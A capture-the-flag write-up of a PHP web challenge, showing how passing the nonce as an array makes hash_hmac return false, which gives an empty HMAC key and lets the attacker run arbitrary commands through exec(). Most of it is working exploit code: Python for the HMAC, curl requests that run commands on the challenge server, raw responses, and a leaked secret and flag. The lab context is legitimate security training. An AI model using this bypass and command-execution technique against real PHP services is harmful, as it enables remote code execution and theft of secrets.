# Web CTF Final H-Duck

The target endpoint (`/`) implements the following logic in PHP, fount in `backup.zip`:

```php
include('vars.php');
if (empty($_POST['hmac']) || empty($_POST['host'])) {
    header('HTTP/1.0 400 Bad Request');
    exit;
}

$secret = get_var("SECRET");
if (isset($_POST['nonce']))
    $secret = hash_hmac('sha256', $_POST['nonce'], $secret);

$hmac = hash_hmac('sha256', $_POST['host'], $secret);

if ($hmac !== $_POST['hmac']) {
    header('HTTP/1.0 403 Forbidden');
    exit;
}

echo exec($_POST['host']);
```

* **SECRET** is retrieved via `get_var("SECRET")` from `vars.php`.
* An optional **nonce** modifies the secret via `hash_hmac('sha256', nonce, secret)`.
* The server then HMACs the `host` command with that secret and compares to the client’s `hmac`.
* Only on a valid match will `exec(host)` be invoked.

---

## Bypassing the HMAC Check

* **Without** a `nonce` parameter, the server uses the raw `SECRET` as the key for HMAC(`host`).
* **With** any `nonce` parameter set, PHP does `isset($_POST['nonce'])===true` and recomputes:

  ```php
  $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
  ```

  * **But** if `$_POST['nonce']` is an array (e.g., `nonce[]`), `hash_hmac()` returns **false**.
  * On the next line, PHP treats that `false` as the empty string `""` when computing the final HMAC of `host`.

By sending `nonce[]`, we force the server to HMAC with an **empty key**.

### Creating the Empty-Key HMAC

For an arbitrary command `CMD`, compute:

```
HMAC = HMAC_SHA256(key="", data=CMD)
```

```python
import hmac, hashlib
H = hmac.new(b"", b"CMD_STRING", hashlib.sha256).hexdigest()
print(H)
```

---

### Listing Files

We also go base64 of `vars.template.php`:

```bash
ndrei@DESKTOP-52JT2BC:~$ curl -v -i -X POST http://ctf-13.security.cs.pub.ro:8001/ \
  -d "host=base64 -w0 vars.template.php" \
  -d "nonce[]=1" \
  -d "hmac=6778a655c2f97ad8996f4e2f0785a01886ff4feaa250ab2dd76e6061c9a52a37" \
  -H "User-Agent: Mozilla/5.0"
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host ctf-13.security.cs.pub.ro:8001 was resolved.
* IPv6: (none)
* IPv4: 141.85.224.110
*   Trying 141.85.224.110:8001...
* Connected to ctf-13.security.cs.pub.ro (141.85.224.110) port 8001
> POST / HTTP/1.1
> Host: ctf-13.security.cs.pub.ro:8001
> Accept: */*
> User-Agent: Mozilla/5.0
> Content-Length: 113
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Sat, 26 Jul 2025 12:16:23 GMT
Date: Sat, 26 Jul 2025 12:16:23 GMT
< Server: Apache/2.4.38 (Debian)
Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.2.34
X-Powered-By: PHP/7.2.34
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Length: 488
Content-Length: 488
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
<br />
<b>Warning</b>:  hash_hmac() expects parameter 2 to be string, array given in <b>/var/www/html/index.php</b> on line <b>12</b><br />
* Connection #0 to host ctf-13.security.cs.pub.ro left intact
PD9waHAKICAgIGZ1bmN0aW9uIGdldF92YXIoJG5hbWUpIHsKICAgICAgICBzd2l0Y2goJG5hbWUpIHsKICAgICAgICAgICAgY2FzZSAnU0VDUkVUJzoKICAgICAgICAgICAgICAgIHJldHVybiAnUVhyemo1UHJhZHF0WTl2eSc7CiAgICAgICAgICAgIGNhc2UgJ0ZMQUcnOgogICAgICAgICAgICAgICAgcmV0dXJuICdfX1RFTVBMQVRFX18nOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuICcnOwogICAgICAgIH0KICAgIH0KPz4Kndrei@DESKTOP-52JT2BC:~$
```

Decoding it showed a php code:

```php
<?php
    function get_var($name) {
        switch($name) {
            case 'SECRET':
                return 'QXrzj5PradqtY9vy';
            case 'FLAG':
                return '__TEMPLATE__';
            default:
                return '';
        }
    }
?>
```


### Dumping Server Variables

The actual flag lives in `vars.php`.  Repeat with:

```bash
CMD='sh -c "base64 -w0 vars.php"'
HMAC=$(python3 - <<'EOF'
import hmac, hashlib
print(hmac.new(b"", b'base64 -w0 vars.php', hashlib.sha256).hexdigest())
EOF
)
curl -s -X POST http://target/ \
  -d "host=$CMD" \
  -d "nonce[]=1" \
  -d "hmac=$HMAC" \
| grep -v hash_hmac() | tail -n1 > vars.php.b64
base64 -d vars.php.b64 > vars.php
```

Extract the flag from the PHP switch:

```bash
grep -Po "case 'FLAG'\s*:\s*return\s*'\K[^']+" vars.php
```

---

### Final Flag

```
SSS{n3v3r_r0ll_y0ur_0wn_crypt0}
```





```bash
ndrei@DESKTOP-52JT2BC:~$ CMD='sh -c "php -r '\''include \"vars.php\"; echo get_var(\"FLAG\");'\'' 2>/dev/null"'

HMAC=$(python3 - << 'EOF'
import hmac, hashlib
cmd = b'sh -c "php -r \'include \\"vars.php\\"; echo get_var(\\"FLAG\\");\' 2>/dev/null"'
print(hmac.new(b"", cmd, hashlib.sha256).hexdigest())
EOF
)
echo "Using HMAC: $HMAC"
Using HMAC: 3c71ddc57f237b68e03e078b4c8b4e53f6e345a7c4fabe40591ed2e3d87cb489
ndrei@DESKTOP-52JT2BC:~$ curl -v -i -X POST http://ctf-13.security.cs.pub.ro:8001/ \
  -d "host=$CMD" \
  -d "nonce[]=1" \
  -d "hmac=$HMAC" \
  -H "User-Agent: Mozilla/5.0"
Note: Unnecessary use of -X or --request, POST is already inferred.
* Host ctf-13.security.cs.pub.ro:8001 was resolved.
* IPv6: (none)
* IPv4: 141.85.224.110
*   Trying 141.85.224.110:8001...
* Connected to ctf-13.security.cs.pub.ro (141.85.224.110) port 8001
> POST / HTTP/1.1
> Host: ctf-13.security.cs.pub.ro:8001
> Accept: */*
> User-Agent: Mozilla/5.0
> Content-Length: 159
> Content-Type: application/x-www-form-urlencoded
>
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Sat, 26 Jul 2025 12:29:03 GMT
Date: Sat, 26 Jul 2025 12:29:03 GMT
< Server: Apache/2.4.38 (Debian)
Server: Apache/2.4.38 (Debian)
< X-Powered-By: PHP/7.2.34
X-Powered-By: PHP/7.2.34
< Vary: Accept-Encoding
Vary: Accept-Encoding
< Content-Length: 171
Content-Length: 171
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
<br />
<b>Warning</b>:  hash_hmac() expects parameter 2 to be string, array given in <b>/var/www/html/index.php</b> on line <b>12</b><br />
* Connection #0 to host ctf-13.security.cs.pub.ro left intact
SSS{n3v3r_r0ll_y0ur_0wn_crypt0}ndrei@DESKTOP-52JT2BC:~$
```
